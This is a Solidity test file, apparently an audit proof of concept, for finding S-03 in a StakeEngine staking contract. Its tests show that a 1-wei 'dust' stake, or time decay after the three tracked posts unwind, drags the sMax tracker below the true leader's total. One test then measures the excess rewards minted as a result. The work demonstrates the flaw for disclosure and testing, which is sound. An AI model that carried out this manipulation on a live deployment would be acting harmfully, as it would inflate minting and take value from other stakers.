// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import "../src/StakeEngine.sol";
import "./mocks/MockVSP.sol";
import "./mocks/MockProtocolPolicy.sol";

/// S-03: `topPosts` has only 3 slots, so `sMax` can fall BELOW the true
/// leader's total. ECONOMIC_INVARIANTS.md I.4 claims:
///   "sMax >= leaderTotal at all times (after update), so participation
///    factors remain <= 1.0 in steady state."
///
/// Attack shape: occupy all 3 tracked slots with posts that later unwind,
/// while an untracked 4th post stays alive. When the 3 tracked posts hit 0,
/// topPosts empties and sMax falls to decay, even though the 4th post is
/// the real leader.
contract S03SMaxTrackerPoC is Test {
    StakeEngine eng;
    MockVSP vsp;
    MockProtocolPolicy policy;

    uint256 constant DEPLOY_RATE_MAX = 693805319167998976;
    uint256 constant RAY = 1e18;

    address alice = address(0xA11CE);
    address bob = address(0xB0B);
    address carol = address(0xCA201);
    address dave = address(0xDA1E);

    function setUp() public {
        vm.warp(86400 * 1000);
        vsp = new MockVSP();
        policy = new MockProtocolPolicy(0);
        policy.setRates(0, DEPLOY_RATE_MAX);
        eng = StakeEngine(
            address(
                new ERC1967Proxy(
                    address(new StakeEngine(address(0))),
                    abi.encodeCall(StakeEngine.initialize, (address(this), address(vsp), address(policy)))
                )
            )
        );
        vsp.mint(address(this), 1e30);
        vsp.approve(address(eng), type(uint256).max);
    }

    function _fund(address who, uint256 amt) internal {
        vsp.mint(who, amt);
        vm.prank(who);
        vsp.approve(address(eng), type(uint256).max);
    }

    function _stake(address who, uint256 post, uint8 side, uint256 amt) internal {
        _fund(who, amt);
        vm.prank(who);
        eng.stake(post, side, amt);
    }

    function _postTotal(uint256 post) internal view returns (uint256) {
        (uint256 s, uint256 c) = eng.getPostTotals(post);
        return s + c;
    }

    function test_S03_SMaxBelowTrueLeader() public {
        // Posts 1,2,3 occupy all three tracked slots with LARGER totals.
        _stake(alice, 1, 0, 300e18);
        _stake(bob, 2, 0, 200e18);
        _stake(carol, 3, 0, 150e18);
        // Post 4 is the untracked survivor: smaller now, but it will outlive them.
        _stake(dave, 4, 0, 80e18);

        (uint256 p0, uint256 t0, uint256 p1, uint256 t1, uint256 p2, uint256 t2) = eng.getTopPosts();
        emit log("--- topPosts after seeding (post 4 is NOT tracked) ---");
        emit log_named_uint("slot0 postId", p0);
        emit log_named_uint("slot0 total", t0);
        emit log_named_uint("slot1 postId", p1);
        emit log_named_uint("slot1 total", t1);
        emit log_named_uint("slot2 postId", p2);
        emit log_named_uint("slot2 total", t2);
        emit log_named_uint("sMax", eng.sMax());
        emit log_named_uint("post4 total (untracked)", _postTotal(4));

        // The three tracked posts fully unwind.
        vm.prank(alice);
        eng.withdraw(1, 0, 300e18, true);
        vm.prank(bob);
        eng.withdraw(2, 0, 200e18, true);
        vm.prank(carol);
        eng.withdraw(3, 0, 150e18, true);

        uint256 sMaxNow = eng.sMax();
        uint256 leaderNow = _postTotal(4);

        emit log("--- after the 3 tracked posts unwind to zero ---");
        emit log_named_uint("sMax", sMaxNow);
        emit log_named_uint("true leader total (post 4)", leaderNow);

        (p0, t0,,,,) = eng.getTopPosts();
        emit log_named_uint("slot0 postId now", p0);
        emit log_named_uint("slot0 total now", t0);

        // Invariant I.4: sMax >= leaderTotal. Report the violation size if any.
        if (sMaxNow < leaderNow) {
            emit log_named_uint("I.4 VIOLATED shortfall", leaderNow - sMaxNow);
            emit log_named_uint("participationRay would be (RAY)", leaderNow * RAY / sMaxNow);
        } else {
            emit log_named_uint("I.4 holds, sMax - leader", sMaxNow - leaderNow);
        }

        // FALSIFIED HYPOTHESIS (kept as documentation): the journal predicted sMax would
        // decay below the leader here. It does not - it stays stale HIGH. I.4 holds at this
        // point. The real breaks are in test_S03_SnapDownToDustLeader / test_S03_DecayBelowLeader.
        assertGe(sMaxNow, leaderNow, "documented: sMax stays stale HIGH right after unwind");
    }

    /// Consequence test: with sMax < T, participationRay clamps to RAY,
    /// meaning the post earns the MAXIMUM rate rather than a participation-scaled one.
    function test_S03_ParticipationClampConsequence() public {
        _stake(alice, 1, 0, 300e18);
        _stake(bob, 2, 0, 200e18);
        _stake(carol, 3, 0, 150e18);
        _stake(dave, 4, 0, 80e18);
        // give post 4 an opposing side so settlement actually mints
        _stake(address(0xBEEF), 4, 1, 1);

        vm.prank(alice);
        eng.withdraw(1, 0, 300e18, true);
        vm.prank(bob);
        eng.withdraw(2, 0, 200e18, true);
        vm.prank(carol);
        eng.withdraw(3, 0, 150e18, true);

        emit log_named_uint("sMax before settle", eng.sMax());
        emit log_named_uint("post4 total before settle", _postTotal(4));

        uint256 before = _postTotal(4);
        vm.warp(block.timestamp + 30 days);
        eng.updatePost(4);
        uint256 after_ = _postTotal(4);

        emit log_named_uint("post4 total after 30d settle", after_);
        emit log_named_uint("growth", after_ > before ? after_ - before : 0);
        emit log_named_uint("sMax after settle", eng.sMax());
    }

    /// Path (b): _updateSMax line ~960 snaps sMax DOWN to leaderTotal unconditionally.
    /// Once topPosts is empty, a 1 wei stake on a fresh post becomes "the leader"
    /// and drags sMax to 1 wei while post 4 still holds 80e18.
    function test_S03_SnapDownToDustLeader() public {
        _stake(alice, 1, 0, 300e18);
        _stake(bob, 2, 0, 200e18);
        _stake(carol, 3, 0, 150e18);
        _stake(dave, 4, 0, 80e18); // untracked survivor

        vm.prank(alice);
        eng.withdraw(1, 0, 300e18, true);
        vm.prank(bob);
        eng.withdraw(2, 0, 200e18, true);
        vm.prank(carol);
        eng.withdraw(3, 0, 150e18, true);

        emit log_named_uint("sMax after unwind (stale high)", eng.sMax());

        // attacker seeds a dust post -> becomes tracked leader
        _stake(address(0xD057), 9, 0, 1);

        uint256 sMaxNow = eng.sMax();
        uint256 leaderNow = _postTotal(4);
        emit log_named_uint("sMax after 1 wei stake on fresh post", sMaxNow);
        emit log_named_uint("true leader total (post 4)", leaderNow);

        if (sMaxNow < leaderNow) {
            emit log_named_uint("I.4 VIOLATED shortfall", leaderNow - sMaxNow);
            emit log_named_uint("raw T/sMax ratio (would clamp to RAY)", leaderNow / sMaxNow);
        }
        assertLt(sMaxNow, leaderNow, "S-03(b): sMax dragged below true leader by a dust post");
    }

    /// Path (a): decay below the true leader.
    function test_S03_DecayBelowLeader() public {
        _stake(alice, 1, 0, 300e18);
        _stake(bob, 2, 0, 200e18);
        _stake(carol, 3, 0, 150e18);
        _stake(dave, 4, 0, 80e18);

        vm.prank(alice);
        eng.withdraw(1, 0, 300e18, true);
        vm.prank(bob);
        eng.withdraw(2, 0, 200e18, true);
        vm.prank(carol);
        eng.withdraw(3, 0, 150e18, true);

        // topPosts now empty -> decay is the fallback. 10%/day, cap 30 epochs.
        vm.warp(block.timestamp + 60 days);
        // trigger _updateSMax on an empty post via a dust stake+exit
        _stake(address(0xD058), 8, 0, 1);
        vm.prank(address(0xD058));
        eng.withdraw(8, 0, 1, true);

        uint256 sMaxNow = eng.sMax();
        uint256 leaderNow = _postTotal(4);
        emit log_named_uint("sMax after 60d with empty topPosts", sMaxNow);
        emit log_named_uint("true leader total (post 4)", leaderNow);
        if (sMaxNow < leaderNow) {
            emit log_named_uint("I.4 VIOLATED shortfall", leaderNow - sMaxNow);
        }
        assertLt(sMaxNow, leaderNow, "S-03(a): sMax decayed below true leader");
    }

    /// SEVERITY: does the I.4 violation actually cause over-minting?
    /// participationRay = T/sMax clamped to RAY. With sMax honest (>> T) the post
    /// earns a scaled-down rate; with sMax dragged to 1 wei it clamps to RAY = max rate.
    /// Differential: identical post 4, only sMax differs.
    function _growthOfPost4(bool dragSMax) internal returns (uint256 growth, uint256 sMaxUsed) {
        vm.warp(86400 * 1000);
        vsp = new MockVSP();
        policy = new MockProtocolPolicy(0);
        policy.setRates(0, DEPLOY_RATE_MAX);
        eng = StakeEngine(
            address(
                new ERC1967Proxy(
                    address(new StakeEngine(address(0))),
                    abi.encodeCall(StakeEngine.initialize, (address(this), address(vsp), address(policy)))
                )
            )
        );
        vsp.mint(address(this), 1e30);
        vsp.approve(address(eng), type(uint256).max);

        _stake(alice, 1, 0, 300e18);
        _stake(bob, 2, 0, 200e18);
        _stake(carol, 3, 0, 150e18);
        _stake(dave, 4, 0, 80e18);
        _stake(address(0xBEEF), 4, 1, 1); // opposing side so settlement mints

        if (dragSMax) {
            vm.prank(alice);
            eng.withdraw(1, 0, 300e18, true);
            vm.prank(bob);
            eng.withdraw(2, 0, 200e18, true);
            vm.prank(carol);
            eng.withdraw(3, 0, 150e18, true);
            _stake(address(0xD057), 9, 0, 1); // dust leader drags sMax to 1 wei
        }

        sMaxUsed = eng.sMax();
        uint256 before = _postTotal(4);
        vm.warp(block.timestamp + 30 days);
        eng.updatePost(4);
        growth = _postTotal(4) - before;
    }

    function test_S03_Severity_OverMinting() public {
        (uint256 gHonest, uint256 sHonest) = _growthOfPost4(false);
        (uint256 gDragged, uint256 sDragged) = _growthOfPost4(true);

        emit log_named_uint("sMax honest", sHonest);
        emit log_named_uint("post4 growth, sMax honest", gHonest);
        emit log_named_uint("sMax dragged", sDragged);
        emit log_named_uint("post4 growth, sMax dragged", gDragged);
        if (gHonest > 0) {
            emit log_named_uint("over-mint ratio (bps)", gDragged * 10000 / gHonest);
        }
        emit log_named_uint("excess minted", gDragged > gHonest ? gDragged - gHonest : 0);
    }
}

